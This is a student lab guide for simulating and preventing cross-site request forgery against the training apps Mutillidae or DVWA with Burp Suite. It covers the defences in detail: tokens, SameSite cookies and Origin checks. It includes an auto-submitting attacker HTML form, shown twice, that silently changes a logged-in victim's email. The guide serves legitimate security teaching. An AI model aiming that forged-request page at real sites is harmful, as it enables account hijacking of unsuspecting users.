# EXPT-07-CSRF-Simulation-and-Prevention.md

_(Copy this whole file into your repo as `EXPT-07-CSRF-Simulation-and-Prevention.md`. — **Note:** this file **does not** include Mutillidae install steps — it assumes Mutillidae is already installed and reachable at `http://localhost/mutillidae/`.)_

---

# Experiment 7 — Simulating & Preventing CSRF (Kali + Mutillidae + Burp)

**Platform:** Kali Linux + Mutillidae (or DVWA) + Burp Suite + a simple local web server for attacker page
**Purpose (one-liner):** demonstrate a Cross-Site Request Forgery (CSRF) attack on a lab target and show defenses (anti-CSRF tokens, SameSite cookies, Referer/Origin checking). Capture clean PoC evidence and provide exam-ready remediation advice.
**Ethics / scope reminder:** perform these tests **only** on authorized lab targets (Mutillidae / DVWA / teacher VM). Use a test account, small, non-destructive state changes, and document scope/time.

---

## Contents

1. Short theory: what CSRF is (exam-ready)
2. Prerequisites (software + lab)
3. Quick checklist (one-page)
4. Step-by-step — discover target action & capture request (Burp)
5. Step-by-step — craft attacker page (PoC) and execute CSRF using victim session
6. Demonstrate defenses: CSRF token check, SameSite cookies, Referer/Origin checks
7. Fallback: DVWA module(s) if Mutillidae unavailable
8. What to capture & sample evidence filenames (for `evidence/`)
9. Mitigations / exact phrasing to use in viva
10. Minimal lab report template (copy-paste)
11. Appendix — useful commands, attacker HTML, and quick tips

---

## 1) Short theory (2–3 sentences you can say to teacher)

CSRF is an attack where a victim's browser is tricked into submitting a request (with the victim’s credentials/cookies) to a target site, causing an unwanted state change (e.g., change email, transfer funds). Defenses include per-request anti-CSRF tokens validated server-side, `SameSite` cookie attributes, and checking the `Origin`/`Referer` header. Always demonstrate CSRF only on authorized lab targets.

---

## 2) Prerequisites

- Kali Linux (updated).
- Mutillidae (or DVWA) running and accessible at `http://localhost/mutillidae/`.
- Burp Suite (Community or Pro) installed. Proxy configured to `127.0.0.1:8080` and Burp CA installed.
- A test user account on the lab app (create one if permitted).
- A small local webserver to host the malicious page (e.g., `python3 -m http.server 8000`).
- Workspace `~/expt07/` to store PoC and evidence.

---

## 3) Quick checklist (one-page before starting exam)

- [ ] Start Apache/MySQL if needed: `sudo systemctl start apache2` & `sudo systemctl start mariadb`.
- [ ] Log in to Mutillidae with a test account in a browser proxied with Burp.
- [ ] Identify an action that changes state (example: change email, transfer amount, change profile).
- [ ] Capture the exact request (Proxy → HTTP history) and save raw request.
- [ ] Create simple attacker HTML (`attacker.html`) that issues the same POST/GET (auto-submit). Host it locally.
- [ ] With victim browser logged in, open attacker page (in same browser) to execute CSRF PoC. Capture the resulting request in Burp and evidence that state changed.
- [ ] Demonstrate defense: replay same attack while token is required / token omitted / SameSite in cookies / referer blocked. Save evidence.
- [ ] Save all screenshots and raw request files in `evidence/`.

---

## 4) Step-by-step — discover the target state-changing action & capture request

### A. Identify a suitable action

Common lab actions: change email, change password, transfer money (on toy apps), change user profile, disable an account. Choose a non-destructive one (e.g., change profile bio or email to `attacker@evil.local`).

### B. Capture the request (use Burp)

1. In proxied browser, log in as the test user to the target site.
2. Perform the state change manually once (e.g., change email → “Save”).
3. In Burp → **Proxy → HTTP history**, find the request that performed the change (usually a `POST` to `/change-email.php` or similar).
4. Right-click the request → **Show request** → verify fields (parameters and cookies). Right-click → **Save item** and save raw request as `evidence/01_original_request.txt`.
5. Note whether the form includes a hidden token field (e.g., `<input type="hidden" name="csrf_token" value="...">`). If yes, save screenshot `evidence/02_form_with_token.png` (or save the raw HTML via Repeater).

---

## 5) Step-by-step — craft an attacker page (PoC) and execute CSRF

### A. Create a basic attacker HTML (example)

Save the following as `~/expt07/attacker.html`. Replace the `action` and input names/values to match the captured request.

```html
<!-- attacker.html (example for a POST-based change-email form) -->
<!DOCTYPE html>
<html>
  <body>
    <h3>Attacker page — auto-submits a change email request</h3>

    <form
      id="csrfForm"
      action="http://localhost/mutillidae/changeemail.php"
      method="POST"
    >
      <input type="hidden" name="email" value="attacker@evil.local" />
      <!-- Do NOT include the server CSRF token -->
    </form>

    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

> NOTE: For a GET-style CSRF, you can craft a `<img src="http://target/path?param=value">` or a link.

### B. Host attacker page locally

```bash
cd ~/expt07
python3 -m http.server 8000
# attacker page available at: http://localhost:8000/attacker.html
```

### C. Execute PoC (lab steps)

1. Ensure victim browser session is still logged into the target site (cookie present).
2. In the **same** browser (so cookies are sent), open `http://localhost:8000/attacker.html`.
3. Burp will capture the outgoing request (the forged POST/GET) — find it in **HTTP history** and save it as `evidence/03_csrf_request.txt`.
4. Verify state change in the application (e.g., view profile/email now `attacker@evil.local`) — take screenshot `evidence/04_state_changed.png`.
5. In your `finding_summary.md`, note exact request, timestamp, and that the attack used the victim’s session cookie implicitly.

**If it fails:** you may see the server reject the request — record the response (403, missing token, redirect). Save as `evidence/05_csrf_rejected.txt`.

---

## 6) Demonstrate defenses & how to verify them

### A. Anti-CSRF token (server-side per-request token)

**How to detect:** Look for a hidden input like `<input type="hidden" name="csrf_token" value="...">` or an `X-CSRF-Token` header used in AJAX. Capture form HTML (`evidence/02_form_with_token.png`).

**Verify token enforcement (PoC):**

1. Replay the same POST but remove or change the token (use Burp Repeater).
2. Click **Go** — if the server rejects it (HTTP 403 / error page / no state change), token is effective. Save `evidence/06_token_replay_rejected.txt`.
3. If token is required but static/predictable, mention that token must be cryptographically random and tied to user session.

### B. `SameSite` cookie attribute

**How to check:** Inspect `Set-Cookie` header after login (Burp or `curl -I`). Example output shows `SameSite=Lax` or `SameSite=Strict`. Save as `evidence/07_cookie_headers.txt`.

**Verify behavior:**

- If `SameSite=Strict`, the browser will not send the cookie on cross-site requests (like attacker page), blocking CSRF for many actions.
- To demo, host attacker page on cross-origin (e.g., `http://localhost:8000`) and show that the subsequent forged request does not include the session cookie (check Burp HTTP history request headers). Save `evidence/08_no_cookie_sent.png` (show `Cookie:` header missing).

_Note:_ Modern browsers respect `SameSite` but server must set it in `Set-Cookie`. Explain this to examiner.

### C. `Origin` / `Referer` header checks

**How to detect/verify:**

1. In Burp, modify the request `Referer` header to something else (or remove it) and resend via Repeater.
2. If server rejects requests with missing/incorrect `Referer` or invalid `Origin`, capture rejection `evidence/09_referer_rejected.txt`.

**Caveat:** Rely on `Origin` for POSTs (more reliable than Referer). Be mindful of proxies that strip headers; explain this limitation.

---

## 7) Fallback: DVWA CSRF module (if Mutillidae unavailable)

- DVWA has a CSRF module (under “CSRF” or “Vulnerabilities”) — set DVWA security to **low** for easy PoC.
- The same attacker HTML approach works: capture DVWA change form, create attacker page, open with victim session to cause change. Save equivalent evidence files.

---

## 8) What to capture & sample evidence filenames (put these in `~/expt07/evidence/`)

1. `evidence/01_original_request.txt` — saved raw request that performs the state change (from Burp).
2. `evidence/02_form_with_token.png` — screenshot showing hidden CSRF token in form (if present).
3. `evidence/03_csrf_request.txt` — raw forged request captured when attacker page executed.
4. `evidence/04_state_changed.png` — screenshot showing app state changed (e.g., email updated).
5. `evidence/05_csrf_rejected.txt` — server response when token missing / defense blocked (if applicable).
6. `evidence/06_token_replay_rejected.txt` — Resend without token / with wrong token — server rejects.
7. `evidence/07_cookie_headers.txt` — `Set-Cookie` showing `SameSite`/`HttpOnly`/`Secure` flags.
8. `evidence/08_no_cookie_sent.png` — forged request without cookie (SameSite behavior).
9. `commands.txt` — list of commands run: `python3 -m http.server`, curl commands, etc.
10. `finding_summary.md` — short one-page summary with remediation.

---

## 9) Mitigations / exact phrasing for viva

Use these bullet points verbatim when explaining what to fix:

- **Use server-side per-request anti-CSRF tokens:** generate a cryptographically random token per user session and embed it in forms (hidden input) and validate it server-side on every state-changing request. Reject requests with missing/invalid tokens.
- **Set `SameSite` on authentication cookies:** `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict` (or `Lax` depending on app flows) reduces risk of cross-site requests including the session cookie.
- **Check `Origin`/`Referer` headers for POST requests:** validate that the request comes from an allowed origin. Use `Origin` for non-simple requests; fall back to `Referer` if needed — but be aware of proxies that may strip headers.
- **Avoid authentication via URL parameters:** never accept session identifiers in the URL (GET).
- **Use double-submit cookie or SameSite + token patterns** as defense-in-depth if single mitigation is not applicable.
- **Keep destructive actions protected by re-authentication or MFA** for high-risk transactions.

---

## 10) Minimal lab report template (copy-paste into `finding_summary.md`)

```
# Finding Summary — EXPT-07 CSRF Simulation & Prevention
**Student:** <Your Name>
**Date:** <dd-mm-yyyy>
**Target:** http://localhost/mutillidae/
**Tools:** Kali Linux, Burp Suite, local HTTP server (python3 -m http.server)

## 1) Steps performed
1. Captured state-changing request (change email POST) in Burp and saved raw request (`evidence/01_original_request.txt`).
2. Created attacker page `attacker.html` that auto-submits the same request and hosted it with `python3 -m http.server 8000`.
3. With victim browser logged in, opened attacker page; Burp captured forged request (`evidence/03_csrf_request.txt`) and application state changed (`evidence/04_state_changed.png`).
4. Tested defenses: replayed request without CSRF token (rejected: `evidence/06_token_replay_rejected.txt`); showed cookie `Set-Cookie` flags (`evidence/07_cookie_headers.txt`).

## 2) Key findings
- [High] CSRF possible on `/changeemail.php` when no anti-CSRF token present — PoC attacker page executed and email changed. Evidence: `evidence/03_csrf_request.txt`, `evidence/04_state_changed.png`.
- [Info] Application sets / does not set `SameSite` on cookies (see `evidence/07_cookie_headers.txt`) — explain behavior.

## 3) Remediations
- Implement server-side per-request CSRF tokens embedded in forms and validated server-side.
- Set `HttpOnly; Secure; SameSite` on session cookies.
- Verify `Origin`/`Referer` for sensitive POSTs and require re-authentication for high-value actions.

## 4) Commands run
- python3 -m http.server 8000 (to host attacker.html)
- curl -I http://localhost/mutillidae/   (header check)

## 5) Conclusion
Demonstrated CSRF PoC on an authorized lab target and verified basic defenses. Evidence and recommended remediations are saved in the `evidence/` folder.
```

---

## 11) Appendix — useful commands, attacker HTML & quick tips

```bash
# workspace
mkdir -p ~/expt07/evidence
cd ~/expt07

# host attacker page locally (in folder with attacker.html)
python3 -m http.server 8000

# quick header check to see cookie flags
curl -I http://localhost/mutillidae/ > evidence/07_cookie_headers.txt

# take a screenshot
gnome-screenshot -a -f ~/expt07/evidence/04_state_changed.png
```

**Attacker HTML (quick copy)** — adjust `action` and field names to match the captured request:

```html
<!DOCTYPE html>
<html>
  <body>
    <form
      id="csrf"
      action="http://localhost/mutillidae/changeemail.php"
      method="POST"
    >
      <input type="hidden" name="email" value="attacker@evil.local" />
    </form>
    <script>
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>
```

**Quick tips**

- Always use the same browser session (so cookies are sent) when executing the PoC.
- If the form uses a hidden CSRF token, view the form HTML to see its name/value; removing it in the forged request demonstrates token enforcement.
- When demonstrating `SameSite`, show that `Cookie:` header is not sent for cross-site requests in Burp HTTP history — that proves the browser blocked the cookie.
- Document all steps and keep the evidence folder tidy — the examiner will ask for the saved raw request + screenshots.

---
